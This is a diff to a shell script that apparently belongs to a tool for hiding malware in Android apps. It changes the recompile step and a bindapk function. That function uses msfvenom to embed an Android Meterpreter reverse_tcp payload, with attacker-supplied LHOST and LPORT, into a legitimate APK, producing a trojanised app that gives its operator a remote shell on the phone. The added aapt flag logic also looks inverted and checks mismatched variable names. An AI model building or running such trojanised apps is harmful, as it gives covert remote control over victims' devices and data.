@@ -115,6 +115,13 @@ recompile() {
 	if [ "${VERBOSE}" = "yes" ]; then
 		vbs_arg="-v"
 	fi
+
+    if [ "${USE_AAPT2}" = "yes" ]; then
+        AAPT=" -a /usr/bin/aapt"
+    else
+        AAPT="-a /usr/bin/aapt2"
+    fi
+
 	apktool ${vbs_arg} b $AAPT -o ${2} ${1}
 	if [ ! -e ${2} ]; then
 		error_msg "Try again with -a option\nBut if still can't recompile, take screenshot and open a issue on github"
@@ -146,9 +153,15 @@ signApk() {
 
 bindapk() {
 	print_status "Binding ${3}"
-	msfvenom -x ${3} -p android/meterpreter/reverse_tcp LHOST=${1} LPORT=${2} --platform android --arch dalvik AndroidMeterpreterDebug=true AndroidWakelock=true -o ${4}
+
+    if [ "${USE_AAPT}" = "yes" ]; then
+        aapt_arg="--use-aapt"
+    fi
+
+	msfvenom -x ${3} -p android/meterpreter/reverse_tcp LHOST=${1} LPORT=${2} --platform android --arch dalvik AndroidMeterpreterDebug=true AndroidWakelock=true ${aapt_arg} -o ${4}
+
 	if [ ! -e ${4} ]; then
-		error_msg "can't bind, take screenshot and open a issue on github"
+		error_msg "Try again with option -a\n, but if still can't bind then take screenshot and open a issue on github"
 		exit 1
 	fi
 	print_status "Binded to ${4}"
